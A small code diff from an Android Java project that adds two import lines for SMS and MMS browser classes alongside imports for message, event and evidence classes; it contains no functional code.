@@ -18,6 +18,8 @@ import android.util.Log;
 import com.ht.RCSAndroidGUI.Mms;
 import com.ht.RCSAndroidGUI.Sms;
 import com.ht.RCSAndroidGUI.Status;
+import com.ht.RCSAndroidGUI.agent.sms.MmsBrowser;
+import com.ht.RCSAndroidGUI.agent.sms.SmsBrowser;
 import com.ht.RCSAndroidGUI.event.EventType;
 import com.ht.RCSAndroidGUI.evidence.Markup;
 import com.ht.RCSAndroidGUI.interfaces.Observer;
